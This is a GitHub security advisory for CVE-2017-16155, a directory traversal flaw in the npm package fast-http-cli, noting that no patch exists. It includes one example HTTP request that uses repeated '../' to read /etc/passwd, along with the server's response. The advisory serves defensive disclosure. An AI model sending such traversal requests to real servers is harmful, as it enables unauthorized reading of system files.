# [H] Directory Traversal in fast-http-cli

## Summary
Severity: High
Advisory: GHSA-9frq-f867-hgqc
CVE: CVE-2017-16155
CWE: CWE-22
Ecosystem: npm
CVSS: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2018-07-23
Source: https://github.com/advisories/GHSA-9frq-f867-hgqc
Type: github-advisory

## Affected
- npm: `fast-http-cli` — affected >=0

## Details
`fast-http-cli` is the command line interface for `fast-http`, a simple web server.

`fast-http-cli` is vulnerable to a directory traversal issue, giving an attacker access to the filesystem by placing "../" in the url.

**Example request:**
```http
GET /../../../../../../../../../../etc/passwd HTTP/1.1
host: localhost
```
 and server Response:
```http
HTTP/1.1 200 OK
Date: Thu, 04 May 2017 23:59:18 GMT
Connection: keep-alive
Transfer-Encoding: chunked

{contents of /etc/passwd}
```


## Recommendation

No patch is available for this vulnerability.

It is recommended that the package is only used for local development, and if the functionality is needed for production, a different package is used instead.

## References
- https://nvd.nist.gov/vuln/detail/CVE-2017-16155
- https://github.com/JacksonGL/NPM-Vuln-PoC/tree/master/directory-traversal/fast-http-cli
- https://github.com/advisories/GHSA-9frq-f867-hgqc
- https://www.npmjs.com/advisories/383
